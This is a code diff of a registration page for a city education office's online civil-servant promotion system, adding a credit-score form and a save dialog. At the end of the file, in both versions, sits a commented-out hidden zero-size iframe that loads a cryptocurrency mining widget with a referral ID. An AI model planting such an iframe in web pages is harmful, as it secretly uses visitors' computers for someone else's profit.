@@ -2,402 +2,522 @@
 <html lang="en">
 
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-  <link rel="icon" href="favicon.ico" type="image/x-icon" />
-  <link href="https://fonts.googleapis.com/css?family=Roboto&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" type="text/css" href="./css/style.css">
-  <title>DISDIKBUD PAREPARE Pendaftaran</title>
-  <style>
-    .logoutWrap {
-      text-align: right;
-      background-color: rgb(48, 156, 214);
-      position: sticky;
-      position: -webkit-sticky;
-      top: 0;
-      margin: 0;
-      z-index: 1;
-    }
-
-    .logoutButton {
-      border-left: oldlace 2px solid;
-      background-color: rgb(226, 81, 81);
-    }
-
-    .wrapbody {
-      visibility: hidden;
-      padding: 5%;
-      overflow: auto;
-    }
-
-    td {
-      text-align: left;
-      vertical-align: middle;
-    }
-
-    td:nth-child(event) {
-      text-align: right;
-    }
-
-    .footer {
-      font-size: small;
-      line-height: 150%;
-    }
-
-    table {
-      min-width: 475px;
-      /* max-width: 550px; */
-    }
-
-    .loading {
-      text-align: center;
-      position: sticky;
-      top: 40vh;
-    }
-
-    .mendaftar {
-      padding: 10px;
-      border: none;
-      outline-style: none;
-      color: rgb(255, 255, 255);
-      background-color: rgb(72, 155, 33);
-      margin-left: 1%;
-      margin-top: 5%;
-      cursor: pointer;
-      -webkit-box-shadow: 3px 3px 7px 1px #4f4f4f;
-      box-shadow: 3px 3px 7px 1px #4f4f4f;
-    }
-
-    .mendaftar:hover {
-      -webkit-box-shadow: 0px 10px 13px -7px #000000, 3px 3px 7px 1px rgba(79, 79, 79, 0);
-      box-shadow: 0px 10px 13px -7px #000000, 3px 3px 7px 1px rgba(79, 79, 79, 0);
-    }
-
-    #syuaib {
-      position: fixed;
-      right: 2%;
-      bottom: 0;
-      font-size: smaller;
-      color: rgb(219, 219, 219);
-      text-shadow: 1px 1px 2px #4f2215;
-    }
-
-    h3,
-    h5 {
-      color: rgb(63, 62, 62);
-    }
-
-    .gmd {
-      -webkit-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
-      -moz-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
-      -ms-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
-      -o-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
-      box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
-    }
-
-    .backform {
-      background-color: rgba(255, 255, 255, 0.75);
-    }
-
-    .wrapterkirim {
-      width: 100%;
-      height: 100%;
-      /* background-color: grey; */
-      position: fixed;
-      z-index: 2;
-      /* text-align: center; */
-      display: none;
-    }
-
-    .terkirim {
-      top: 40%;
-      position: relative;
-    }
-
-    .terkirim button {
-      display: block;
-      padding: 15px;
-      background-color: rgb(72, 155, 33);
-      color: whitesmoke;
-      border: none;
-      margin-left: 95px;
-    }
-
-    #tdnama {
-      width: 50%;
-    }
-
-    input[type="file"] {
-      height: 32px;
-      width: 100px;
-      cursor: pointer;
-    }
-
-    input[type="file"]::-webkit-file-upload-button {
-      height: 32px;
-      width: 100px;
-      cursor: pointer;
-    }
-
-    .uploadInp {
-      position: absolute;
-      opacity: 0;
-      cursor: pointer;
-    }
-
-    .upload {
-      width: 100px;
-      border: none;
-      background-color: rgb(0, 141, 7);
-      color: aliceblue;
-      padding: 9px;
-    }
-
-    .namaBerkas {
-      font-size: 8px;
-      margin-left: 5px;
-    }
-
-    #idAsn {
-      max-width: 500px;
-      /* border-bottom: #4f4f4f 1px solid; */
-    }
-
-    /* @media screen and (max-width: 437px) {
-        table {
-          min-width: 390px;
-          max-width: 500px;
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
+    <link href="https://fonts.googleapis.com/css?family=Roboto&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" type="text/css" href="./css/style.css">
+    <link rel="stylesheet" href="./js/jqueryui/jquery-ui.css">
+    <link rel="stylesheet" href="./js/jqueryui/jquery-ui.structure.css">
+    <link rel="stylesheet" href="./js/jqueryui/jquery-ui.theme.css">
+    <title>DISDIKBUD PAREPARE Pendaftaran</title>
+    <style>
+        .logoutWrap {
+            text-align: right;
+            background-color: rgb(48, 156, 214);
+            position: sticky;
+            position: -webkit-sticky;
+            top: 0;
+            margin: 0;
+            z-index: 1;
         }
-      } */
-  </style>
+
+        .logoutButton {
+            border-left: oldlace 2px solid;
+            background-color: rgb(226, 81, 81);
+        }
+
+        .wrapbody {
+            visibility: hidden;
+            padding: 5%;
+            overflow: auto;
+        }
+
+        td {
+            text-align: left;
+            vertical-align: middle;
+        }
+
+        td:nth-child(event) {
+            text-align: right;
+        }
+
+        .footer {
+            font-size: small;
+            line-height: 150%;
+        }
+
+        table {
+            min-width: 475px;
+            /* max-width: 550px; */
+        }
+
+        .loading {
+            text-align: center;
+            position: sticky;
+            top: 40vh;
+        }
+
+        #syuaib {
+            position: fixed;
+            right: 2%;
+            bottom: 0;
+            font-size: smaller;
+            color: rgb(219, 219, 219);
+            text-shadow: 1px 1px 2px #4f2215;
+        }
+
+        h3,
+        h5 {
+            color: rgb(63, 62, 62);
+        }
+
+        .gmd {
+            -webkit-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
+            -moz-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
+            -ms-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
+            -o-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
+            box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
+        }
+
+        .backform {
+            background-color: rgba(255, 255, 255, 0.75);
+        }
+
+        #tdnama {
+            width: 50%;
+        }
+
+        #idAsn {
+            max-width: 500px;
+        }
+
+        #simpan {
+            margin-top: 40px;
+        }
+
+        #juu,
+        #jup,
+        #juujup {
+            text-align: center;
+        }
+
+        #tablePak td:nth-child(3) {
+            padding-right: 0;
+            padding-left: 13px;
+        }
+
+        #progressbar {
+            position: relative;
+        }
+
+        #progress-label {
+            position: absolute;
+            left: 40%;
+            top: 4px;
+            font-weight: bold;
+            text-shadow: 1px 1px 0 #fff;
+        }
+    </style>
 </head>
 
 <body>
-  <div class="logoutWrap">
-    <ul class="nav">
-      <li class="nav masukan">Beranda</li>
-      <li class="nav logoutButton">KELUAR</li>
-    </ul>
-  </div>
-  <div class="wrap">
-    <div class="wrapheader">
-      <span class="title">DINAS PENDIDIKAN DAN KEBUDAYAAN KOTA PAREPARE <br />SUB BIDANG
-        ADMINISTRASI DAN KEPEGAWAIAN</span>
+    <div class="logoutWrap">
+        <ul class="nav">
+            <li class="nav masukan">Beranda</li>
+            <li class="nav logoutButton">KELUAR</li>
+        </ul>
     </div>
-    <div class="loading">
-      <img src="./image/Eclipse.svg" alt="loading" />
-    </div>
-    <div class="wrapbody">
-      <h3>Pastikan data Anda berikut ini sudah benar, lalu tekan tombol <i>selanjutnya</i> !. Jika ada data Anda yang
-        salah, silahkan ke kantor, dengan membawa dokumen penunjang asli.</h3>
-      <table id="idAsn">
-        <tr>
-          <td style="width: 50%;">NAMA</td>
-          <td style="width: 2%;">:</td>
-          <td style="width: 58%;" id="tblNama"></td>
-        </tr>
-        <tr>
-          <td>NIP</td>
-          <td>:</td>
-          <td id="tblNip"></td>
-        </tr>
-        <tr>
-          <td>NUPTK</td>
-          <td>:</td>
-          <td id="tblNuptk"></td>
-        </tr>
-        <tr>
-          <td>NO. KARPEG</td>
-          <td>:</td>
-          <td id="tblKarpeg"></td>
-        </tr>
-        <tr>
-          <td>TEMPAT LAHIR</td>
-          <td>:</td>
-          <td id="tblTempatLahir"></td>
-        </tr>
-        <tr>
-          <td>TANGGAL LAHIR</td>
-          <td>:</td>
-          <td id="tblTglLahir"></td>
-        </tr>
-        <tr>
-          <td>JENIS KELAMIN</td>
-          <td>:</td>
-          <td id="tblJk"></td>
-        </tr>
-        <tr>
-          <td>PENDIDIKAN TERAKHIR</td>
-          <td>:</td>
-          <td id="tblPendidikan"></td>
-        </tr>
-        <tr>
-          <td>PANGKAT</td>
-          <td>:</td>
-          <td id="tblPangkat"></td>
-        </tr>
-        <tr>
-          <td>GOLONGAN/RUANG</td>
-          <td>:</td>
-          <td id="tblGolongan"></td>
-        </tr>
-        <tr>
-          <td>TMT PANGKAT TERAKHIR</td>
-          <td>:</td>
-          <td id="tblTmtPangkat"></td>
-        </tr>
-        <tr>
-          <td>TMT JABATAN GURU</td>
-          <td>:</td>
-          <td id="tblTmtJabatan"></td>
-        </tr>
-        <tr>
-          <td>MASA KERJA GOLONGAN</td>
-          <td>:</td>
-          <td id="tblMkg"></td>
-        </tr>
-        <tr>
-          <td>UNIT KERJA</td>
-          <td>:</td>
-          <td id="tblUnit"></td>
-        </tr>
-        <tr>
-          <td colspan="3"><b>Atasan Langsung<b></td>
-        </tr>
-        <tr>
-          <td>NAMA</td>
-          <td>:</td>
-          <td id="tblNamaAtasan"></td>
-        </tr>
-        <tr>
-          <td>NIP</td>
-          <td>:</td>
-          <td id="tblNipAtasan"></td>
-        </tr>
-        <tr>
-          <td>PANGKAT</td>
-          <td>:</td>
-          <td id="tblPangkatAtasan"></td>
-        </tr>
-        <tr>
-          <td>GOLONGAN/RUANG</td>
-          <td>:</td>
-          <td id="tblGolonganAtasan"></td>
-        </tr>
-        <!-- <tr>
+    <div class="wrap">
+        <div class="wrapheader">
+            <span class="title">DINAS PENDIDIKAN DAN KEBUDAYAAN KOTA PAREPARE <br />SUB BIDANG
+                ADMINISTRASI UMUM DAN KEPEGAWAIAN</span>
+        </div>
+        <div class="loading">
+            <img src="./image/Eclipse.svg" alt="loading" />
+        </div>
+        <div class="wrapbody">
+            <h3>Pastikan data Anda berikut ini sudah benar, lalu tekan tombol <i>selanjutnya</i> !. Jika ada data Anda
+                yang salah, silahkan ke kantor, dengan membawa dokumen penunjang asli.</h3>
+            <table id="idAsn">
+                <tr>
+                    <td style="width: 50%;">NAMA</td>
+                    <td style="width: 2%;">:</td>
+                    <td style="width: 58%;" id="tblNama"></td>
+                </tr>
+                <tr>
+                    <td>NIP</td>
+                    <td>:</td>
+                    <td id="tblNip"></td>
+                </tr>
+                <tr>
+                    <td>NUPTK</td>
+                    <td>:</td>
+                    <td id="tblNuptk"></td>
+                </tr>
+                <tr>
+                    <td>NO. KARPEG</td>
+                    <td>:</td>
+                    <td id="tblKarpeg"></td>
+                </tr>
+                <tr>
+                    <td>TEMPAT LAHIR</td>
+                    <td>:</td>
+                    <td id="tblTempatLahir"></td>
+                </tr>
+                <tr>
+                    <td>TANGGAL LAHIR</td>
+                    <td>:</td>
+                    <td id="tblTglLahir"></td>
+                </tr>
+                <tr>
+                    <td>JENIS KELAMIN</td>
+                    <td>:</td>
+                    <td id="tblJk"></td>
+                </tr>
+                <tr>
+                    <td>PENDIDIKAN TERAKHIR</td>
+                    <td>:</td>
+                    <td id="tblPendidikan"></td>
+                </tr>
+                <tr>
+                    <td>PANGKAT</td>
+                    <td>:</td>
+                    <td id="tblPangkat"></td>
+                </tr>
+                <tr>
+                    <td>GOLONGAN/RUANG</td>
+                    <td>:</td>
+                    <td id="tblGolongan"></td>
+                </tr>
+                <tr>
+                    <td>TMT PANGKAT TERAKHIR</td>
+                    <td>:</td>
+                    <td id="tblTmtPangkat"></td>
+                </tr>
+                <tr>
+                    <td>TMT JABATAN GURU</td>
+                    <td>:</td>
+                    <td id="tblTmtJabatan"></td>
+                </tr>
+                <tr>
+                    <td>MASA KERJA GOLONGAN</td>
+                    <td>:</td>
+                    <td id="tblMkg"></td>
+                </tr>
+                <tr>
+                    <td>UNIT KERJA</td>
+                    <td>:</td>
+                    <td id="tblUnit"></td>
+                </tr>
+                <tr>
+                    <td colspan="3"><b>Atasan Langsung<b></td>
+                </tr>
+                <tr>
+                    <td>NAMA</td>
+                    <td>:</td>
+                    <td id="tblNamaAtasan"></td>
+                </tr>
+                <tr>
+                    <td>NIP</td>
+                    <td>:</td>
+                    <td id="tblNipAtasan"></td>
+                </tr>
+                <tr>
+                    <td>PANGKAT</td>
+                    <td>:</td>
+                    <td id="tblPangkatAtasan"></td>
+                </tr>
+                <tr>
+                    <td>GOLONGAN/RUANG</td>
+                    <td>:</td>
+                    <td id="tblGolonganAtasan"></td>
+                </tr>
+                <!-- <tr>
           <td>TMT PANGKAT TERAKHIR</td>
           <td>:</td>
           <td id="tblTmtPangkatAtasan"></td>
         </tr> -->
-        <tr>
-          <td>JABATAN</td>
-          <td>:</td>
-          <td id="tblJabatanAtasan"></td>
-        </tr>
-      </table>
-      <button class="mendaftar" id="simpan">Selanjutnya</button>
+                <tr>
+                    <td>JABATAN</td>
+                    <td>:</td>
+                    <td id="tblJabatanAtasan"></td>
+                </tr>
+            </table>
+            <table id="tablePak" class="tableColor">
+                <tr>
+                    <th colspan="3">NILAI PAK LAMA</th>
+                </tr>
+                <tr>
+                    <th>No.</th>
+                    <th>Unsur Penilaian</th>
+                    <th style="width: 100px;">Angka Kredit</th>
+                </tr>
+                <tr>
+                    <th colspan="3">Unsur Utama</th>
+                </tr>
+                <tr>
+                    <td>1</td>
+                    <td>Mengikuti Pendidikan dan memperoleh gelar Ijazah</td>
+                    <td><input type="number" id="ijazah" value=0></td>
+                </tr>
+                <tr>
+                    <td>2</td>
+                    <td>Mengikuti Pelatihan Prajabatan</td>
+                    <td><input type="number" id="prajabatan" value=0></td>
+                </tr>
+                <tr>
+                    <td>3</td>
+                    <td>Pembelajaran/bimbingan dan Tugas Tertentu</td>
+                    <td><input type="number" id="tertentu" value=0></td>
+                </tr>
+                <tr>
+                    <td>4</td>
+                    <td>Melaksanakan Pengembangan Diri</td>
+                    <td><input type="number" id="diri" value=0></td>
+                </tr>
+                <tr>
+                    <td>5</td>
+                    <td>Melaksanakan Publikasi Ilmiah</td>
+                    <td><input type="number" id="ilmiah" value=0></td>
+                </tr>
+                <tr>
+                    <td>6</td>
+                    <td>Melaksanakan Karya Inovatif</td>
+                    <td><input type="number" id="inovatif" value=0></td>
+                </tr>
+                <tr>
+                    <td colspan="2"><b>Jumlah Unsur Utama</b></td>
+                    <td id="juu">0</td>
+                </tr>
+                <tr>
+                    <th colspan="3">Unsur Penunjang</th>
+                </tr>
+                <tr>
+                    <td>1</td>
+                    <td>Penunjang Tugas Guru</td>
+                    <td><input type="number" id="guru" value=0></td>
+                </tr>
+                <tr>
+                    <td colspan="2"><b>Jumlah Unsur Penunjang</b></td>
+                    <td id="jup">0</td>
+                </tr>
+                <tr>
+                    <td colspan="2"><b>Jumlah Unsur Utama dan Unsur Penunjang</b></td>
+                    <td id="juujup">0</td>
+                </tr>
+                <tr>
+                    <td colspan="3" style="text-align: right;"><button class="mendaftar" id="simpanPak">Simpan</button>
+                    </td>
+                </tr>
+            </table>
+            <div id="dialog-confirm" title="Simpan nilai PAK?" style="display: none;">
+                <p><span class="ui-icon ui-icon-alert" style="float:left; margin:12px 12px 20px 0;"></span></p>
+            </div>
+            <div id="dialog-pesan" title="Pesan" style="display: none; text-align: center; padding: 2em 1em;">
+                <div id="progressbar">
+                    <div id="progress-label"></div>
+                </div>
+                <span></span>
+            </div>
+            <button class="mendaftar" id="simpan">Selanjutnya</button>
+        </div>
+
+        <div class="wrapfooter">
+            <p class="footer">
+                Naik Pangkat dan Kenaikan Gaji Berkala secara online diselenggarakan untuk mempermudah setiap ASN dalam
+                melakukan proses pendaftaran dan mempercepat proses administrasi kepegawaian di lingkup Dinas Pendidikan
+                dan Kebudayaan Kota Parepare
+            </p>
+        </div>
     </div>
 
-    <div class="wrapfooter">
-      <p class="footer">
-        Naik Pangkat dan Kenaikan Gaji Berkala secara online diselenggarakan
-        untuk mempermudah setiap ASN dalam melakukan proses pendaftaran dan
-        mempercepat proses administrasi kepegawaian di lingkup Dinas
-        Pendidikan dan Kebudayaan Kota Parepare
-      </p>
-    </div>
-  </div>
+    <!-- <p id="syuaib">Code/Design By syuaib</p> -->
+    <script src="/js/main.js"></script>
+    <script src="/js/jquery.js"></script>
+    <script src="/js/jqueryui/jquery-ui.js"></script>
+    <script>
+        let logoutButton = document.querySelector(".logoutButton");
+        let wrapbody = document.querySelector(".wrapbody");
+        let wrapterkirim = document.querySelector(".wrapterkirim");
+        let tutup = document.querySelector("#tutup");
+        let loading = document.querySelector(".loading");
+        let simpan = document.querySelector("#simpan");
+        let skTerakhir = document.querySelector("#skTerakhir");
+        let masukan = document.querySelector(".masukan");
+        let btnUpload = document.querySelectorAll(".upload");
+        let namaBerkas = document.querySelectorAll(".namaBerkas");
+        masukan.addEventListener("click", () => location.assign("status.html"));
 
-  <!-- <p id="syuaib">Code/Design By syuaib</p> -->
-  <script src="/js/main.js"></script>
-  <script src="/js/jquery.js"></script>
-  <script>
-    let logoutButton = document.querySelector(".logoutButton");
-    let wrapbody = document.querySelector(".wrapbody");
-    let wrapterkirim = document.querySelector(".wrapterkirim");
-    let tutup = document.querySelector("#tutup");
-    let loading = document.querySelector(".loading");
-    let simpan = document.querySelector("#simpan");
-    let skTerakhir = document.querySelector("#skTerakhir");
-    let barisBerkas = document.querySelectorAll("tr");
-    let berkas = document.querySelectorAll("input");
-    let masukan = document.querySelector(".masukan");
-    let btnUpload = document.querySelectorAll(".upload");
-    let namaBerkas = document.querySelectorAll(".namaBerkas");
-    masukan.addEventListener("click", () => location.assign("status.html"));
-    var i;
+        main.cekLogin();
+        main.cekDua().then(function (res) {
+            if (res.status) {
+                mulai();
+            } else {
+                location.assign("status.html");
+            }
+        }).catch(err => {
+            console.log(err);
+        });
 
-    main.cekLogin();
-    main.cekDua().then(function (res) {
-      if (res.status) {
-        mulai();
-      } else {
-        location.assign("status.html");
-      }
-    }).catch(err => {
-      console.log(err);
-    });
+        function mulai() {
+            let dataPegawai = JSON.parse(localStorage.getItem("db"));
+            let dataPak;
+            if(dataPegawai.NILAI_PAK_LAMA){
+                dataPak = JSON.parse(dataPegawai.NILAI_PAK_LAMA);
+                $("#ijazah").val(dataPak.uu.ijazah);
+                $("#tertentu").val(dataPak.uu.tertentu);
+                $("#prajabatan").val(dataPak.uu.prajabatan);
+                $("#diri").val(dataPak.uu.diri);
+                $("#inovatif").val(dataPak.uu.inovatif);
+                $("#ilmiah").val(dataPak.uu.ilmiah);
+                $("#juu").text(dataPak.uu.juu);
+                $("#guru").val(dataPak.up.guru);
+                $("#jup").text(dataPak.up.jup);
+                $("#juujup").text(parseFloat(dataPak.uu.juu) + parseFloat(dataPak.up.jup));
+            }
+            
+            let tmtji = dataPegawai.TMT_PANGKAT_TERAKHIR;
+            // let tmt = tmtji.split("/");
+            let tmtJabji = dataPegawai.TMT_JABATAN_GURU;
+            // let tmtJab = tmtJabji.split("/");
+            let lahir = dataPegawai.TANGGAL_LAHIR;
+            // let tglLahir = lahir.split("/");
+            $('#tblNama').html(dataPegawai.NAMA);
+            $('#tblNip').html(dataPegawai.NIP);
+            $('#tblNuptk').html(dataPegawai.NUPTK);
+            $('#tblKarpeg').html(dataPegawai.NO_KARPEG);
+            $('#tblTempatLahir').html(dataPegawai.TEMPAT_LAHIR);
+            $('#tblTglLahir').html(lahir);
+            $('#tblJk').html(dataPegawai.JENIS_KELAMIN);
+            $('#tblPendidikan').html(dataPegawai.PENDIDIKAN_TERAKHIR);
+            $('#tblPangkat').html(dataPegawai.PANGKAT);
+            $('#tblGolongan').html(dataPegawai.GOLONGAN_RUANG);
+            $('#tblTmtPangkat').html(tmtji);
+            $('#tblTmtJabatan').html(tmtJabji);
+            $('#tblMkg').html(dataPegawai.MASA_KERJA_GOLONGAN);
+            $('#tblUnit').html(main.lastArr(dataPegawai.UNIT_KERJA));
+            $('#tblNamaAtasan').html(main.lastArr(dataPegawai.NAMA_ATASAN_LANGSUNG));
+            $('#tblNipAtasan').html(dataPegawai.NIP_ATASAN_LANGSUNG);
+            $('#tblPangkatAtasan').html(dataPegawai.PANGKAT_ATASAN_LANGSUNG);
+            $('#tblGolonganAtasan').html(dataPegawai.GOLONGAN_ATASAN_LANGSUNG);
+            // $('#tblTmtPangkatAtasan').html(dataPegawai.TMT_PANGKAT_TERAKHIR_ATASAN_LANGSUNG);
+            $('#tblJabatanAtasan').html(main.lastArr(dataPegawai.JABATAN_ATASAN_LANGSUNG));
+            
 
-    function mulai() {
-      let dataPegawai = JSON.parse(localStorage.getItem("db"));
-      let tmtji = dataPegawai.TMT_PANGKAT_TERAKHIR;
-      // let tmt = tmtji.split("/");
-      let tmtJabji = dataPegawai.TMT_JABATAN_GURU;
-      // let tmtJab = tmtJabji.split("/");
-      let lahir = dataPegawai.TANGGAL_LAHIR;
-      // let tglLahir = lahir.split("/");
-      $('#tblNama').html(dataPegawai.NAMA);
-      $('#tblNip').html(dataPegawai.NIP);
-      $('#tblNuptk').html(dataPegawai.NUPTK);
-      $('#tblKarpeg').html(dataPegawai.NO_KARPEG);
-      $('#tblTempatLahir').html(dataPegawai.TEMPAT_LAHIR);
-      $('#tblTglLahir').html(lahir);
-      $('#tblJk').html(dataPegawai.JENIS_KELAMIN);
-      $('#tblPendidikan').html(dataPegawai.PENDIDIKAN_TERAKHIR);
-      $('#tblPangkat').html(dataPegawai.PANGKAT);
-      $('#tblGolongan').html(dataPegawai.GOLONGAN_RUANG);
-      $('#tblTmtPangkat').html(tmtji);
-      $('#tblTmtJabatan').html(tmtJabji);
-      $('#tblMkg').html(dataPegawai.MASA_KERJA_GOLONGAN);
-      $('#tblUnit').html(main.lastArr(dataPegawai.UNIT_KERJA));
-      $('#tblNamaAtasan').html(main.lastArr(dataPegawai.NAMA_ATASAN_LANGSUNG));
-      $('#tblNipAtasan').html(dataPegawai.NIP_ATASAN_LANGSUNG);
-      $('#tblPangkatAtasan').html(dataPegawai.PANGKAT_ATASAN_LANGSUNG);
-      $('#tblGolonganAtasan').html(dataPegawai.GOLONGAN_ATASAN_LANGSUNG);
-      // $('#tblTmtPangkatAtasan').html(dataPegawai.TMT_PANGKAT_TERAKHIR_ATASAN_LANGSUNG);
-      $('#tblJabatanAtasan').html(main.lastArr(dataPegawai.JABATAN_ATASAN_LANGSUNG));
+            loading.setAttribute("style", "display:none");
+            wrapbody.setAttribute("style", "visibility:visible");
 
-      loading.setAttribute("style", "display:none");
-      wrapbody.setAttribute("style", "visibility:visible");
+            //////////////////upload process/////////////////
+            simpan.addEventListener("click", () => location.assign('upload.html'));
+        }
 
+        let inpUu = $("#tablePak input").slice(0, 6);
+        inpUu.keyup((e) => {
+            hasil("#juu", inpUu);
+        });
 
-      //////////////////////get index input button //////////////////////
-      for (i = 0; i < berkas.length; i++) {
-        (function (index) {
-          berkas[i].onchange = function () {
-            console.log(index);
-            namaBerkas[index].innerHTML = berkas[index].files[0].name;
-          };
-        })(i);
-      }
+        let inpUp = $("#tablePak input").slice(6);
+        inpUp.keyup((e) => {
+            hasil("#jup", inpUp);
+        })
 
-      //////////////////upload process/////////////////
-      simpan.addEventListener("click", () => location.assign('upload.html'));
-    }
+        function hasil(id, inp) {
+            let tambah = new Array();
+            inp.filter((index, elem) => {
+                let nilai = parseFloat($(elem).val());
+                if (!isNaN(nilai)) {
+                    tambah.push(nilai);
+                } else {
+                    tambah.push(0);
+                }
 
+                let sum = tambah.reduce((a, b) => {
+                    return a + b;
+                });
 
-    ///////////////////sign out//////////////////////////////////////////////
-    logoutButton.addEventListener("click", keluar);
+                let sum2 = Math.round((sum + Number.EPSILON) * 1000) / 1000
+                $(id).text(sum2);
+                let hasilJuuJup = parseFloat($("#juu").text()) + parseFloat($("#jup").text())
+                if (!isNaN(hasilJuuJup)) {
+                    $("#juujup").text(hasilJuuJup);
+                }
+            });
+        }
+        $("#dialog-pesan").dialog({ autoOpen: false });
+        $("#simpanPak").click((e) => {
+            let nilaiPak = { uu: { ijazah: 0, prajabatan: 0, tertentu: 0, diri: 0, ilmiah: 0, inovatif: 0, juu: 0 }, up: { guru: 0, jup: 0 } }
+            nilaiPak.uu.ijazah = $("#tablePak #ijazah").val();
+            nilaiPak.uu.prajabatan = $("#tablePak #prajabatan").val();
+            nilaiPak.uu.tertentu = $("#tablePak #tertentu").val();
+            nilaiPak.uu.diri = $("#tablePak #diri").val();
+            nilaiPak.uu.ilmiah = $("#tablePak #ilmiah").val();
+            nilaiPak.uu.inovatif = $("#tablePak #inovatif").val();
+            nilaiPak.uu.juu = $("#tablePak #juu").text();
+            nilaiPak.up.guru = $("#tablePak #guru").val();
+            nilaiPak.up.jup = $("#tablePak #jup").text();
+            $("#dialog-confirm p").text("Yakin akan menyimpan nilai PAK?");
+            $(function () {
+                $("#dialog-confirm").dialog({
+                    resizable: false,
+                    height: "auto",
+                    width: 400,
+                    modal: true,
+                    buttons: {
+                        "Ya": function () {
+                            if(!navigator.onLine){
+                                    alert("Pastikan Anda terhubung ke Internet!")
+                                    return;
+                                }
+                            let durasi = 100 / (JSON.stringify(nilaiPak).length * navigator.connection.downlink) * 1000;
+                            $("#dialog-confirm").dialog("close");
+                            $("#dialog-pesan").dialog("open");
+                            $("#dialog-pesan span").hide();
+                            let progressbar = $("#progressbar");
+                            progressbar.show();
+                            progressbar.progressbar({
+                                change: () => {
+                                    let val = progressbar.progressbar("value");
+                                    $("#progress-label").text(val + '%');
+                                },
+                                complete: () => {
+                                    $("#progress-label").text("Selesai");
+                                }
+                            })
+                            for (let i = 0; i < durasi; i++) {
+                                setTimeout(() => {
+                                    let jalan = 100/durasi*i
+                                    progressbar.progressbar("value", Math.round(jalan))
+                                })
+                            }
 
-    function keluar() {
-      loading.setAttribute("style", "display:block");
-      wrapbody.setAttribute("style", "display:none");
-      main.logout()
-      location.assign('index.html');
-    }
-  </script>
-  <!-- <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=0C052766283C&mode=widget" style="overflow:hidden;width:0;height:0;"></iframe> -->
+                            (async () => {
+                                let tunggu = await main.kirimPak(nilaiPak);
+                                progressbar.hide();
+                                $("#dialog-pesan span").text(tunggu.status);
+                                $("#dialog-pesan span").show();
+                            })();
+                        },
+                        "Tidak": function () {
+                            $(this).dialog("close");
+                        }
+                    }
+                });
+            });
+        })
+
+        ///////////////////sign out//////////////////////////////////////////////
+        logoutButton.addEventListener("click", keluar);
+
+        function keluar() {
+            loading.setAttribute("style", "display:block");
+            wrapbody.setAttribute("style", "display:none");
+            main.logout()
+            location.assign('index.html');
+        }
+    </script>
+    <!-- <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=0C052766283C&mode=widget" style="overflow:hidden;width:0;height:0;"></iframe> -->
 </body>
 
 </html>
